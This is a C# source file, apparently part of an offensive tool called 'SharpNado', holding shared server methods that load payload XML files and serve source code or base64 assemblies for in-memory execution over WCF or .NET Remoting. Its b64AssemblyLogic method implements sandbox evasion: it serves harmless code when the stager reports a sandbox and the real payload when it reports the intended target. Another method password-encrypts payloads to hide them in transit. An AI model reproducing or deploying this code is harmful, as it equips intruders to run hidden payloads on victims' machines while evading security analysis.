using System;
using System.Collections.Generic;
using System.Linq;
using System.Xml;

//Shared methods that can be called by either WCF payloads or .Net Remoting payloads
public class SharedMethods
{
    //Retrieves xml payloads that contain source code to be compiled and executed in memory
    public String[] getPayloadCompileSource(string xml)
    {
        string xmlPayload = xml + ".xml";
        XmlDocument payloadXML = new XmlDocument();
        payloadXML.Load(Program.payloadDir + xmlPayload);
        XmlNode catalog = payloadXML.SelectSingleNode("catalog");
        List<string> list = new List<string>();

        foreach (XmlNode payload in catalog.SelectNodes("payload"))
        {
            list.Add(payload.InnerText);
        }
        foreach (XmlNode CompileVersion in catalog.SelectNodes("CompileVersion"))
        {
            list.Add(CompileVersion.InnerText);
        }
        foreach (XmlNode Namespace in catalog.SelectNodes("Namespace"))
        {
            list.Add(Namespace.InnerText);
        }
        foreach (XmlNode Class in catalog.SelectNodes("Class"))
        {
            list.Add(Class.InnerText);
        }
        foreach (XmlNode Method in catalog.SelectNodes("Method"))
        {
            list.Add(Method.InnerText);
        }
        foreach (XmlNode Reference in catalog.SelectNodes("Reference"))
        {
            list.Add(Reference.InnerText);
        }
        String[] source = list.ToArray();
        return source;
    }
    //Retrieves payloads that contain base64 assembly to be executed in memory
    //Payload code based off of my project SharpCradle
    public String[] getPayloadBase64_1(string xml)
    {
        string xmlPayload = xml + ".xml";
        XmlDocument payloadXML = new XmlDocument();
        payloadXML.Load(Program.payloadDir + xmlPayload);
        XmlNode catalog = payloadXML.SelectSingleNode("catalog");
        List<string> list = new List<string>();

        foreach (XmlNode payload in catalog.SelectNodes("payload"))
        {
            list.Add(payload.InnerText);
        }
        foreach (XmlNode CompileVersion in catalog.SelectNodes("args"))
        {
            list.Add(CompileVersion.InnerText);
        }
        String[] source = list.ToArray();
        return source;
    }
    //Retrieves payloads that contain base64 assembly to be executed in memory
    //Payload code is a slightly modified version of @malcomvetter ManagedInjection tool
    //But you must know type and class
    public String[] getPayloadBase64_2(string xml)
    {
        string xmlPayload = xml + ".xml";
        XmlDocument payloadXML = new XmlDocument();
        payloadXML.Load(Program.payloadDir + xmlPayload);
        XmlNode catalog = payloadXML.SelectSingleNode("catalog");
        List<string> list = new List<string>();

        foreach (XmlNode payload in catalog.SelectNodes("payload"))
        {
            list.Add(payload.InnerText);
        }
        foreach (XmlNode Class in catalog.SelectNodes("type"))
        {
            list.Add(Class.InnerText);
        }
        foreach (XmlNode Method in catalog.SelectNodes("class"))
        {
            list.Add(Method.InnerText);
        }
        foreach (XmlNode CompileVersion in catalog.SelectNodes("args"))
        {
            list.Add(CompileVersion.InnerText);
        }
        String[] source = list.ToArray();
        return source;
    }
    //Retrieves payloads that contain base64 assembly to be executed in memory
    //Payload code based off of my project SharpCradle
    //Stager sends back 0 or 1 and method sends appropriate payload depending on message recieved
    //Both stager and payload made as simple or complex as you like
    public String[] b64AssemblyLogic(string xml, string xml2, string sandboxEvade)
    {
        Console.WriteLine();
        Console.WriteLine("Sandbox Method Called");//Server message letting you know method was called remotely
        Console.Write("SharpNado:> ");

        //Non-Malicious payload/action to send if sandboxed
        string xmlPayload = xml + ".xml";
        XmlDocument payloadXML = new XmlDocument();
        payloadXML.Load(Program.payloadDir + xmlPayload);
        XmlNode catalog = payloadXML.SelectSingleNode("catalog");
        List<string> list = new List<string>();

        foreach (XmlNode payload in catalog.SelectNodes("payload"))
        {
            list.Add(payload.InnerText);
        }
        foreach (XmlNode CompileVersion in catalog.SelectNodes("args"))
        {
            list.Add(CompileVersion.InnerText);
        }

        String[] source = list.ToArray();

        //Payload to send if executed on intended target
        string xmlPayload2 = xml2 + ".xml";
        XmlDocument payloadXML2 = new XmlDocument();
        payloadXML2.Load(Program.payloadDir + xmlPayload2);
        XmlNode catalog2 = payloadXML2.SelectSingleNode("catalog");
        List<string> list2 = new List<string>();

        foreach (XmlNode payload in catalog2.SelectNodes("payload"))
        {
            list2.Add(payload.InnerText);
        }
        foreach (XmlNode CompileVersion in catalog2.SelectNodes("args"))
        {
            list2.Add(CompileVersion.InnerText);
        }

        String[] source2 = list2.ToArray();

        if (sandboxEvade == "0")
        {
            Console.WriteLine();
            Console.WriteLine("Sandboxed! Sending non-malicious code or if count is too high shut service down");
            Console.Write("SharpNado:> ");
            Program.count = Program.count + 1;
            Console.WriteLine();
            Console.WriteLine(Program.count);
            Console.WriteLine();

            //If threshold is met kill application
            if (Program.count == 5)
            {
                Environment.Exit(0);
            }

            return source;
        }
        if (sandboxEvade == "1")
        {
            Console.WriteLine();
            Console.WriteLine("We hit our target...Sending the payload");
            Console.Write("SharpNado:> ");

            return source2;
        }
        else
        {
            Environment.Exit(0);
            return null;
        }
    }//End Sandbox Evade
    //Retrieves payloads that contain base64 assembly to be executed in memory
    //Payload code based off of my project SharpCradle
    //Sends payload encypted with password and stager then decrypts with password
    public String[] encryptString(string xml, string pass)
    {
        string xmlPayload = xml + ".xml";
        XmlDocument payloadXML = new XmlDocument();
        payloadXML.Load(Program.payloadDir + xmlPayload);
        XmlNode catalog = payloadXML.SelectSingleNode("catalog");
        List<string> list = new List<string>();
        List<string> list2 = new List<string>();
        foreach (XmlNode payload in catalog.SelectNodes("payload"))
        {
            list.Add(payload.InnerText);
        }
        foreach (XmlNode CompileVersion in catalog.SelectNodes("args"))
        {
            list2.Add(CompileVersion.InnerText);
        }
        //String[] source = list.ToArray();

        //Payload and password

        string encryptString = list[0];
        List<string> list3 = new List<string>();
        //String[] args = list2.ToArray();
        string password = pass;

        //Encrypt string
        string encryptedstring = StringCipher.Encrypt(encryptString, password);

        foreach (string arg in list2)
        {
            string encryptArg = StringCipher.Encrypt(arg, password);
            list3.Add(encryptArg);
        }

        //Payload to send if executed on intended target
        List<string> list4 = new List<string>();
        list4.Add(encryptedstring);
        list4.Add(password);
        foreach (string arg in list3)
        {
            list4.Add(arg);
        }
        String[] encryptedPayload = list4.ToArray();

        return encryptedPayload;
    }
}//End SharedMethods Class


